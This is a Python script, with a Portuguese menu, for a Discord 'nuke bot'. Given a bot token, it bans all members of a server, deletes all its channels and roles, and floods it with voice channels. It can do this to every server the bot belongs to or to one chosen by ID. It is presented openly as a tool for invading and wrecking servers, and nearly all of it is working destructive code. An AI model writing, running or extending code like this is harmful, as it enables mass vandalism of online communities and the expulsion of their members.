import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):print(text, end='');return input()

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}𝐁𝐎𝐓 𝐁𝐲: {g}𝐡𝐭𝐭𝐩𝐬://𝐭.𝐦𝐞/𝐋𝐄𝐎𝐌𝐎𝐃𝐙𝐎𝐅𝐂'''



async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned


async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild):
    print(f'{r}𝐍𝐔𝐊𝐄: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}𝐁𝐀𝐍𝐈𝐃𝐎:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}𝐃𝐄𝐋𝐀𝐓𝐀𝐑 𝐂𝐀𝐍𝐀𝐋:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{m}𝐃𝐄𝐋𝐄𝐓𝐀𝐑 𝐑𝐎𝐋𝐄𝐒:{b}{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'{m}𝐂𝐑𝐈𝐖𝐑 𝐂𝐀𝐍𝐀𝐋 𝐃𝐄 𝐕𝐎𝐙:{b}{created_channels}')
    #created_roles = await created_roles(guild,name)
    #print(f'{m}Create Roles:{b}{created_roles}')
    print(f'{r}--------------------------------------------\n\n')


while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[𝐌𝐄𝐍𝐔]
    {y}└─[1] {m}- {g}𝐒𝐓𝐀𝐑 𝐋𝐄𝐎 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐒𝐎𝐄𝐒
    {y}└─[2] {m}- {g}𝐒𝐀𝐈𝐑
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}𝐃𝐈𝐆𝐈𝐓𝐄 𝐎 𝐓𝐎𝐊𝐄𝐍 𝐃𝐎 𝐁𝐎𝐓:{g}')
        name = _input(f'{y}I𝐃𝐈𝐆𝐈𝐓𝐄 𝐎 𝐍𝐎𝐌𝐄 𝐃𝐈 𝐂𝐀𝐍𝐀𝐋:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}𝐑𝐀𝐃𝐈𝐀𝐑 𝐓𝐎𝐃𝐎𝐒 𝐒𝐄𝐑𝐕𝐈𝐃𝐈𝐑𝐄𝐒
    {y}└─[2] {m}- {g}𝐑𝐀𝐃𝐈𝐀𝐑 𝐀𝐏𝐄𝐍𝐀𝐒 𝐔𝐌 𝐒𝐄𝐄𝐕𝐈𝐎𝐑
    {y}└─[3] {m}- {g}𝐒𝐀𝐈𝐑
{y}====>{g}''')
        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]𝐋𝐎𝐆𝐀𝐃𝐎 𝐂𝐎𝐌𝐎 {client.user.name}
[+]𝐁𝐎𝐓 𝐈𝐍 {len(client.guilds)} 𝐒𝐄𝐑𝐕𝐄𝐑𝐒!''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{y}𝐃𝐈𝐆𝐈𝐓𝐄 𝐎 𝐋𝐈𝐍𝐊 𝐃𝐎 𝐒𝐄𝐑𝐕𝐄𝐑:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}𝐒𝐀𝐈𝐑...')
            exit()
        try:
            client.run(token)
            input('𝐑𝐀𝐃𝐈𝐀𝐃𝐎 𝐂𝐎𝐌 𝐒𝐔𝐂𝐄𝐒𝐒𝐎 𝐁𝐘 𝐋𝐃𝐎 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐃𝐎𝐄𝐒')
        except Exception as error:
            if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
            else:
                input(f'{r}{error}\n{b}𝐏𝐓𝐄𝐂𝐈𝐎𝐍𝐄 𝐄𝐍𝐓𝐄𝐑 𝐏𝐀𝐑𝐀 𝐕𝐎𝐋𝐓𝐀𝐑 𝐀𝐎 𝐍𝐄𝐍𝐔 𝐈𝐍𝐈𝐂𝐈𝐀𝐋')
            continue
    elif choice == '2':
        print(f'{dr}𝐒𝐀𝐈𝐑...')
        exit()